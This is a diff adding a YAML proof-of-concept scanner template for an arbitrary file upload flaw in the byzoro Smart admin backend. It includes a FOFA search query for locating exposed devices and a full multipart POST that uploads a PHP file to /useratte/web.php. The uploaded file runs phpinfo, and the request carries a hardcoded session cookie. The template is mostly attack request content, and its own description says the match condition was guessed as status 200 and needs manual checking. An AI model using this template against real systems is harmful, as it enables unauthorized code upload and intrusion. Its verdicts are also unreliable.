@@ -1,0 +1,82 @@
+id: poc-65558cdfc22e24c14792
+info:
+  name: 百卓Smart后台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/65558cdfc22e24c14792332e45a9d676
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 65558cdfc22e24c14792332e45a9d676
+    fofa: + fofa`app="byzoro-Smart"`
+http:
+- raw:
+  - 'POST /useratte/web.php? HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: PHPSESSID=6fca23a63591d8742708a4c50308f150
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like GeckoAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
+
+    Content-Length: 611
+
+    Upgrade-Insecure-Requests: 1
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-User: ?1
+
+    Te: trailers
+
+    Connection: close
+
+
+    -----------------------------42328904123665875270630079328
+
+    Content-Disposition: form-data; name="file_upload"; filename="2.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php phpinfo(); ?>
+
+    -----------------------------42328904123665875270630079328
+
+    Content-Disposition: form-data; name="id_type"
+
+
+    1
+
+    -----------------------------42328904123665875270630079328
+
+    Content-Disposition: form-data; name="1_ck"
+
+
+    1_radhttp
+
+    -----------------------------42328904123665875270630079328
+
+    Content-Disposition: form-data; name="mode"
+
+
+    import
+
+    -----------------------------42328904123665875270630079328'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
